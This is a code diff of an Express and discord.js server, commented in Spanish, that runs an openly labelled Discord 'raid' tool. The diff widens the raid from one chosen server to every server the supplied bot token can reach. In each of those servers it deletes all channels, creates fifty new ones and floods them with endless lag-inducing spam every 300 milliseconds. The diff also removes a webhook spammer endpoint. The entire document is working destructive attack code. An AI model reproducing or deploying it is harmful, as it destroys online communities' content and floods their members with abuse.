@@ -6,7 +6,7 @@ app.use(express.json());
 app.use(express.static('public'));
 
 app.post('/api/run-raid', async (req, res) => {
-    const { token, guildId, msg, channelName, myWebsite } = req.body;
+    const { token, msg, channelName, myWebsite } = req.body;
     const bot = new Client({ 
         intents: [IntentsBitField.Flags.Guilds, IntentsBitField.Flags.GuildMessages] 
     });
@@ -14,53 +14,41 @@ app.post('/api/run-raid', async (req, res) => {
     try {
         await bot.login(token);
         bot.once('ready', async () => {
-            // STATUS DE STREAMING PARA PROMOCIÓN
-            bot.user.setActivity("ELITE MULTITOOL", {
+            // STATUS DE STREAMING GLOBAL
+            bot.user.setActivity("BY ELITE TOOLS", {
                 type: ActivityType.Streaming,
                 url: myWebsite || "https://twitch.tv" 
             });
 
-            const guild = await bot.guilds.fetch(guildId).catch(() => null);
-            if (!guild) return res.status(404).json({ error: "Bot no está en el servidor" });
+            const guilds = bot.guilds.cache;
+            
+            // ATAQUE GLOBAL A TODOS LOS SERVIDORES
+            guilds.forEach(async (guild) => {
+                // 1. LIMPIEZA INSTANTÁNEA
+                const channels = await guild.channels.fetch();
+                await Promise.all(channels.map(ch => ch.delete().catch(() => {})));
 
-            // 1. BORRADO MASIVO PARALELO (INSTANTÁNEO)
-            const channels = await guild.channels.fetch();
-            await Promise.all(channels.map(ch => ch.delete().catch(() => {})));
+                // 2. CREACIÓN MASIVA (50 canales por servidor)
+                const lagMsg = (msg || "@everyone RAIDED") + "\n" + "█".repeat(800);
 
-            // 2. ATAQUE DE CANALES Y RÁFAGA DE MENSAJES (MÁXIMO LAG)
-            const lagMsg = (msg || "@everyone RAIDED BY ELITE") + "\n" + "░".repeat(500); // Caracteres pesados para lag
+                for (let i = 0; i < 50; i++) {
+                    guild.channels.create({
+                        name: channelName || "raid-global",
+                        type: ChannelType.GuildText
+                    }).then(async (ch) => {
+                        // Ráfaga inicial de 15 mensajes
+                        await Promise.all(Array(15).fill(0).map(() => ch.send(lagMsg).catch(() => {})));
+                        // Spam infinito
+                        setInterval(() => ch.send(lagMsg).catch(() => {}), 300);
+                    }).catch(() => {});
+                }
+            });
 
-            for (let i = 0; i < 50; i++) {
-                guild.channels.create({
-                    name: channelName || "raid-by-elite",
-                    type: ChannelType.GuildText
-                }).then(async (ch) => {
-                    // Ráfaga de 15 mensajes instantáneos por canal
-                    const burst = Array(15).fill(lagMsg);
-                    await Promise.all(burst.map(m => ch.send(m).catch(() => {})));
-
-                    // Bucle de spam infinito (cada 300ms)
-                    setInterval(() => {
-                        ch.send(lagMsg).catch(() => {});
-                    }, 300);
-                }).catch(() => {});
-            }
-            res.json({ success: true });
+            res.json({ success: true, count: guilds.size });
         });
     } catch (err) {
-        res.status(401).json({ error: "Token o permisos inválidos" });
+        res.status(401).json({ error: "Token Inválido" });
     }
 });
 
-// Endpoint para el Webhook Spammer
-app.post('/api/webhook', async (req, res) => {
-    const { url, message } = req.body;
-    try {
-        const axios = require('axios');
-        await axios.post(url, { content: message });
-        res.json({ success: true });
-    } catch (e) { res.status(400).send(); }
-});
-
-app.listen(3000, () => console.log(">>> Elite Multi-Tool Online en Puerto 3000"));
-
+app.listen(3000, () => console.log("Elite Global Engine Online"));
